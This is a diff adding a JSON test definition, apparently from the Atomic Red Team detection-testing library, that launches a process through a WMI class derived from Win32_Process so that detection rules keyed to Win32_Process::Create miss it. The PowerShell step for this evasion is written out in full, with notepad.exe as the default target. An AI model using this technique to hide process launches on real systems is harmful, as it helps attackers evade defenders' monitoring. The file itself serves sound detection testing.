@@ -1,0 +1,58 @@
+{
+  "id": "10447c83-fc38-462a-a936-5102363b1c43",
+  "name": "Create a Process using obfuscated Win32_Process",
+  "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "98672a24-a2e6-4d78-8bec-932d5f0e0314",
+      "type": "execute-command",
+      "data": {
+        "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8b9ae935-f952-46c7-b0c8-554ed857227c",
+      "type": "execute-command",
+      "data": {
+        "command": "$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"#{new_class}\"))\ntry { $CleanupClass.Delete() } catch {}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "98672a24-a2e6-4d78-8bec-932d5f0e0314",
+      "p": "on-success",
+      "o": "8b9ae935-f952-46c7-b0c8-554ed857227c"
+    },
+    {
+      "s": "98672a24-a2e6-4d78-8bec-932d5f0e0314",
+      "p": "on-failure",
+      "o": "8b9ae935-f952-46c7-b0c8-554ed857227c"
+    }
+  ],
+  "tags": [
+    "T1047",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "new_class",
+      "type": "string",
+      "description": "Derived class name",
+      "value": "Win32_Atomic"
+    },
+    {
+      "name": "process_to_execute",
+      "type": "string",
+      "description": "Name or path of process to execute.",
+      "value": "notepad.exe"
+    }
+  ]
+}
